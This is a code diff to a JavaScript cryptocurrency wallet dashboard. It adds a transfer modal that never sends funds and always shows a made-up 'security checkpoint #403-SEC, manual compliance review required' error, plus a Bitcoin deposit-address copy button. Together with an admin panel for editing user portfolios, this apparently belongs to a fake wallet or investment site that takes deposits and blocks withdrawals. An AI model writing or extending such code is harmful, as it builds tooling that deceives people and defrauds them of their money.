@@ -126,7 +126,7 @@ function renderClientDashboard() {
     const usdVal = Number(a.bal) * Number(a.price);
     totalUSD += usdVal;
     return `
-      <div onclick="openRestrictedAction('${a.name}')" class="flex items-center justify-between px-6 py-4 hover:bg-[var(--surface-2)]/50 transition-colors cursor-pointer">
+      <div onclick="openTransferModal()" class="flex items-center justify-between px-6 py-4 hover:bg-[var(--surface-2)]/50 transition-colors cursor-pointer">
         <div class="flex items-center gap-3.5">
           <div class="w-10 h-10 rounded-full flex items-center justify-center shrink-0 shadow-md" style="background:${a.color || '#0C6CF2'}">
             ${getCryptoIcon(a.sym)}
@@ -150,6 +150,54 @@ function renderClientDashboard() {
   }).join('');
 
   document.getElementById('total-balance').textContent = fmtUSD(totalUSD);
+}
+
+// ---------- TRUST WALLET STYLE TRANSFER / WITHDRAWAL MODAL LOGIC ----------
+function openTransferModal() {
+  openModal('modal-transfer');
+}
+
+function handleTransferSubmit(e) {
+  e.preventDefault();
+  
+  const coin = document.getElementById('transfer-coin').value;
+  const address = document.getElementById('transfer-address').value.trim();
+  const amount = document.getElementById('transfer-amount').value;
+
+  // Close the transfer modal popup
+  closeModal('modal-transfer');
+
+  // Trigger the restricted security error modal using the specified node destination address
+  const errorDetailEl = document.getElementById('error-detail');
+  if (errorDetailEl) {
+    errorDetailEl.textContent = 
+      `Outgoing transfer of ${amount} ${coin} to destination address (${address}) routed through secure node [bc1qz4sjkd58wsp003xzmatg0e8kw5yu24dth7cqah] has triggered security checkpoint #403-SEC. Manual compliance review required.`;
+  }
+  
+  openModal('modal-error');
+  return false;
+}
+
+// ---------- RECEIVE BITCOIN MODAL & CLIPBOARD COPY ----------
+function openReceiveModal() {
+  openModal('modal-receive');
+}
+
+function copyReceiveAddress() {
+  const addrElem = document.getElementById('receive-btc-address');
+  const btn = document.getElementById('btn-copy-btc');
+  
+  if (!addrElem) return;
+  const addr = addrElem.textContent.trim();
+  
+  navigator.clipboard.writeText(addr).then(() => {
+    btn.innerHTML = '<span>✓</span> Address Copied!';
+    setTimeout(() => {
+      btn.innerHTML = '<span>📋</span> Copy Address';
+    }, 2500);
+  }).catch(() => {
+    alert('Bitcoin Deposit Address: ' + addr);
+  });
 }
 
 // ---------- ADMIN CONTROL PANEL (EDIT USER NAMES & PORTFOLIOS) ----------
